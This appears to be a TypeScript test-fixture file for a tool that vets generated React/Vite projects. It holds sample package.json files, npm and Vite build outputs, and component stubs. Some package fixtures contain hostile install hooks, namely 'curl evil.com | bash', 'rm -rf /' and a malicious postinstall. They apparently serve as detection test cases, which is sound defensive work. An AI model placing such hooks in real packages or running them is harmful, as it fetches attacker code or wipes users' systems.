// Shared test fixtures

export function makePackageJson(
  scripts: Record<string, string> = { build: 'vite build' },
  deps: Record<string, string> = { react: '^18.0.0', 'react-dom': '^18.0.0' },
  devDeps: Record<string, string> = {}
): string {
  return JSON.stringify({ name: 'test-pkg', version: '0.0.1', private: true, scripts, dependencies: deps, devDependencies: devDeps }, null, 2);
}

export const SAFE_PKG = makePackageJson();

export const PREINSTALL_PKG = makePackageJson({ preinstall: 'curl evil.com | bash', build: 'vite build' });
export const POSTINSTALL_PKG = makePackageJson({ postinstall: 'node malicious.js', build: 'vite build' });
export const PREPARE_PKG = makePackageJson({ prepare: 'sh -c "rm -rf /"', build: 'vite build' });
export const PREPUBLISH_PKG = makePackageJson({ prepublish: 'evil-script', build: 'vite build' });

export const SUSPICIOUS_PKG = makePackageJson(
  { build: 'vite build' },
  { react: '^18.0.0', 'evil-shell-runner': '^1.0.0', 'node-exec-helper': '^2.0.0' }
);

export const UNKNOWN_DEP_PKG = makePackageJson(
  { build: 'vite build' },
  { react: '^18.0.0', 'some-random-ui-lib': '^1.0.0' }
);

// ── npm install output fixtures ───────────────────────────────────────────────

export const NPM_ERESOLVE_OUTPUT = `
npm ERR! code ERESOLVE
npm ERR! ERESOLVE unable to resolve dependency tree
npm ERR! Found: react@17.0.2
npm ERR! Could not resolve dependency: peer react@"^18.0.0" from react-dom@18.0.0
`;

export const NPM_404_OUTPUT = `
npm ERR! 404 Not Found - GET https://registry.npmjs.org/@myorg/missing-package - Not found
npm ERR! 404 '@myorg/missing-package@latest' is not in this registry.
`;

export const NPM_TIMEOUT_OUTPUT = `Fetching packages...\n[BUILD TIMEOUT]`;

export const NPM_SUCCESS_OUTPUT = `added 120 packages in 5s`;

// ── Vite build output fixtures ────────────────────────────────────────────────

export const VITE_IMPORT_ERROR = `
[plugin:vite:resolve] Failed to resolve import "lucide-react" from "src/components/Icon.tsx".
error during build:
`;

export const VITE_TS_ERROR = `
src/App.tsx:12:5: error: Type 'string' is not assignable to type 'number'
`;

export const VITE_JSX_ERROR = `
src/App.tsx:5:1: error: Unexpected token, expected jsx element
`;

export const VITE_ROLLUP_EXPORT_ERROR = `
"useAuth" is not exported by "src/lib/auth.ts", imported by "src/pages/Login.tsx"
`;

export const VITE_BUILD_TIMEOUT = `[BUILD TIMEOUT]`;

export const VITE_SUCCESS_OUTPUT = `
✓ 42 modules transformed.
dist/index.html                  0.56 kB
dist/assets/index-abc123.js    142.30 kB
`;

// ── Project file fixtures ─────────────────────────────────────────────────────

export const APP_TSX = {
  name: 'App.tsx',
  path: 'src/',
  lang: 'tsx',
  content: `import React from 'react';
import { Hero } from './components/Hero';
import { Features } from './components/Features';
export default function App() {
  return <div><Hero /><Features /></div>;
}`,
};

export const HERO_TSX = {
  name: 'Hero.tsx',
  path: 'src/components/',
  lang: 'tsx',
  content: `import React from 'react';
export function Hero() { return <section>Hero</section>; }`,
};

export const FEATURES_TSX = {
  name: 'Features.tsx',
  path: 'src/components/',
  lang: 'tsx',
  content: `import React from 'react';
export function Features() { return <section>Features</section>; }`,
};
